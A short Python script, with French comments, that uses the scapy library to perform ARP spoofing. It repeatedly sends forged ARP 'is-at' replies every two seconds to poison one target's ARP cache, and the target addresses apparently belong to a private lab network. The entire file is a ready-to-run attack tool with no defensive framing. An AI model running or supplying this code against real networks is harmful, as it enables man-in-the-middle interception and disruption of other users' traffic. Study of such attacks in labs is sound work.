import scapy.all as scapy
import time

class ArpSpoofing:
    def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
        self.ip_src = ip_src
        self.mac_src = mac_src
        self.ip_dst = ip_dst
        self.mac_dst = mac_dst
        self.interface = interface

    def spoof(self):
        # Créer un paquet ARP de type "is-at" (op=2) et l'envoyer
        # Fonctionnement à confirmer
        eth = scapy.Ether(dst=self.mac_dst, src=self.mac_src)
        arp = scapy.ARP(op=2, hwsrc=self.mac_src, psrc=self.ip_src, hwdst=self.mac_dst, pdst=self.ip_dst)
        packet = eth / arp
        print(packet.summary())
        scapy.sendp(packet, iface=self.interface, verbose=False)

    def start_spoofing(self):
        try:
            while True:
                self.spoof()
                time.sleep(2)
        except Exception as e:
            print("Arrêt du spoofing ARP de "+self.ip_dst+" - "+str(e))
    
    def __str__(self):
        return f"ArpSpoofing(ip_src={self.ip_src}, mac_src={self.mac_src}, ip_dst={self.ip_dst}, mac_dst={self.mac_dst}, interface={self.interface})"


s = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
print(s)
s.start_spoofing()